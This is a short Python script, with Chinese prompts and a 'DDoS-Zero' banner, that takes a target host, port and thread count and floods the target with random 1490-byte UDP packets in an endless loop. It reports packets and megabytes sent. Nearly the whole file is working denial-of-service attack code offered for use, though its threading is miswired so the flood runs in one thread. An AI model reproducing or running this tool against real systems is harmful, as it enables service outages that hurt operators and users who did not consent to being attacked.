import os
import sys
import socket
import random
import threading

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    

logo = Colors.MAGENTA + """
 ____  ____       ____       _____ 
|  _ \|  _ \  ___/ ___|     |__  /___ _ __ ___ 
| | | | | | |/ _ \___ \ _____ / // _ \ '__/ _ \ 
| |_| | |_| | (_) |__) |_____/ /|  __/ | | (_) | 
|____/|____/ \___/____/     /____\___|_|  \___/ 
"""
def is_ip(address):
    try:
        socket.inet_aton(address)
        return True
    except socket.error:
        return False

def aaa(xb):
    user_input = xb
    if is_ip(user_input):
        return xb
    else:
        try:
            ip = socket.gethostbyname(user_input)
            return ip
        except socket.gaierror:
            print("无法解析域名，请检查输入是否正确。")

print(logo)
def main():
    if len(sys.argv) < 4:
        print('传入的参数不足，请重新输入参数')
        ip = input(Colors.RED + "请输入域名或IP:")
        port = int(input("请输入端口    :"))
        thread = int(input("请输入线程数  :"))
    else:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        thread = int(sys.argv[3])
        input(Colors.RED + f"按回车向使用{thread}个线程{ip}:{port}发起攻击:")
    
    threads = []
    for i in range(thread):
        t = threading.Thread(target=my_function(ip,port,thread))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
    
    
def my_function(ip,port,thread):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 1
    xxx = aaa(ip)
    while True:
        for i in range(0,1000):
            sock.sendto(bytes, (ip,port))
        print(Colors.GREEN + f'已向{ip}:{port}发送'+str(sent)+"000个数据包共"+str(1490*sent//1024)+"MB数据")
        sent += 1


if __name__ == "__main__":
    main()
